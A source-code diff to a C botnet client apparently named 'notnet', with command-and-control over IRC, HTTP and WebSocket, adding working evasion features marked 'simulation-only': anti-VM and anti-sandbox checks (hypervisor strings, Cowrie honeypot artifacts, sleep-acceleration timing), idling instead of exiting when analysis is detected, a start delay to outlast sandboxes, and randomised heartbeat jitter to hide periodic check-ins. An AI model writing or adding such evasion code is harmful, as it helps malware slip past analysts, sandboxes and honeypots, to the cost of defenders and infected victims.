@@ -286,6 +286,10 @@ static int init_bot(void) {
     if (g_bot.heartbeat_interval == 0) g_bot.heartbeat_interval = HEARTBEAT_INTERVAL;
     /* #191: brute-force budget default (config key spread_budget_ms) */
     if (g_bot.spread_budget_ms == 0) g_bot.spread_budget_ms = SPREAD_BUDGET_DEFAULT_MS;
+    /* ISSUE #159: DGA TLD default (dga_seed empty = DGA disabled) */
+    if (g_bot.dga_tld[0] == '\0') {
+        snprintf(g_bot.dga_tld, sizeof(g_bot.dga_tld), "%s", DGA_TLD_DEFAULT);
+    }
     
     log_init();
     log_info("notnet v%s starting", NOTNET_VERSION);
@@ -320,6 +324,61 @@ static void cleanup_bot(void) {
     /* Flush logs */
     log_flush();
     log_close();
+}
+
+/* ── Anti-VM / Anti-Sandbox (#159, SIMULATION-ONLY) ─────────── */
+/* One-shot sweep, run before the main loop ONLY when anti_vm=1
+ * (default 0 = never called). Returns 1 when an analysis environment
+ * is detected. Checks (issue-specified):
+ *   1. /sys/class/dmi/id/product_name contains QEMU/KVM/VirtualBox/VMware
+ *   2. /proc/scsi/scsi contains "QEMU"
+ *   3. Cowrie honeypot artifacts: /usr/bin/cowrie exists or hostname
+ *      contains "cowrie"
+ *   4. Fast-forward timing anomaly: two 100ms sleeps must take at least
+ *      180ms of wall clock — sandboxes that accelerate sleep() fail this.
+ * On a hit main() idles in hourly checks instead of exiting: exiting
+ * instantly is itself a sandbox tell and abandons the implant; real
+ * families idle on analysis boxes. */
+static int anti_vm_sandbox_detected(void) {
+    char buf[512];
+    FILE *f;
+
+    /* 1. DMI product name */
+    f = fopen("/sys/class/dmi/id/product_name", "r");
+    if (f) {
+        size_t n = fread(buf, 1, sizeof(buf) - 1, f);
+        fclose(f);
+        buf[n] = '\0';
+        if (strstr(buf, "QEMU") || strstr(buf, "KVM") ||
+            strstr(buf, "VirtualBox") || strstr(buf, "VMware")) {
+            return 1;
+        }
+    }
+
+    /* 2. SCSI host adapter strings */
+    f = fopen("/proc/scsi/scsi", "r");
+    if (f) {
+        size_t n = fread(buf, 1, sizeof(buf) - 1, f);
+        fclose(f);
+        buf[n] = '\0';
+        if (strstr(buf, "QEMU")) return 1;
+    }
+
+    /* 3. Cowrie honeypot indicators */
+    if (access("/usr/bin/cowrie", F_OK) == 0) return 1;
+    if (gethostname(buf, sizeof(buf)) == 0 && strstr(buf, "cowrie")) return 1;
+
+    /* 4. Timing fast-forward check */
+    struct timespec t0, t1;
+    clock_gettime(CLOCK_MONOTONIC, &t0);
+    usleep(100000);
+    usleep(100000);
+    clock_gettime(CLOCK_MONOTONIC, &t1);
+    long ms = (t1.tv_sec - t0.tv_sec) * 1000L +
+              (t1.tv_nsec - t0.tv_nsec) / 1000000L;
+    if (ms < 180) return 1;
+
+    return 0;
 }
 
 /* ── Main Loop ──────────────────────────────────────────────── */
@@ -407,6 +466,32 @@ int main(void) {
              g_bot.c2_enabled & C2_IRC,
              g_bot.c2_enabled & C2_HTTP,
              g_bot.c2_enabled & C2_WS);
+
+    /* ISSUE #159 (SIMULATION-ONLY): anti-VM / anti-sandbox sweep.
+     * Runs ONCE before the main loop, only when anti_vm=1 (default 0 —
+     * no sweep, unchanged boot). On detection the bot idles in hourly
+     * checks rather than exiting (see anti_vm_sandbox_detected comment
+     * for why idle beats exit). */
+    if (g_bot.anti_vm) {
+        if (anti_vm_sandbox_detected()) {
+            log_info("sandbox detected, idling");
+            while (g_running) {
+                sleep(ANTI_VM_IDLE_CHECK_S);
+            }
+            cleanup_bot();
+            return EXIT_SUCCESS;
+        }
+        log_info("anti_vm sweep clean");
+    }
+
+    /* ISSUE #159 (SIMULATION-ONLY): sleep-on-start (start_delay_s=,
+     * 0..3600, default 0 = no delay). Evades sandbox runs that give up
+     * early and desynchronizes fleet boot noise. */
+    if (g_bot.start_delay_s > 0) {
+        log_info("start delay: sleeping %u s before main loop",
+                 (unsigned)g_bot.start_delay_s);
+        sleep((unsigned int)g_bot.start_delay_s);
+    }
     
     /* Heartbeat timer */
     time_t last_heartbeat = time(NULL);
@@ -464,6 +549,19 @@ int main(void) {
         
         /* Periodic heartbeat (on HEARTBEAT_INTERVAL timer, not every loop) */
         uint32_t hb_interval = (g_bot.heartbeat_interval > 0) ? g_bot.heartbeat_interval : HEARTBEAT_INTERVAL;
+        /* ISSUE #159 (SIMULATION-ONLY): heartbeat jitter. When
+         * heartbeat_jitter= is set (percent 0..50, default 0), the next
+         * interval is base ± random(base*jitter/100), drawn from the
+         * getrandom-backed random_uint32() in util.c — check-ins become
+         * non-periodic (70%..130% of period at 30% jitter). Default 0:
+         * span is 0 and the exact base interval applies, unchanged. */
+        if (g_bot.heartbeat_jitter_pct > 0) {
+            uint32_t jspan = hb_interval * g_bot.heartbeat_jitter_pct / 100;
+            if (jspan > 0) {
+                uint32_t r = random_uint32() % (2u * jspan + 1u);
+                hb_interval = hb_interval - jspan + r;
+            }
+        }
         if (time(NULL) - last_heartbeat >= hb_interval) {
             protocol_send_heartbeat(&g_bot);
             last_heartbeat = time(NULL);
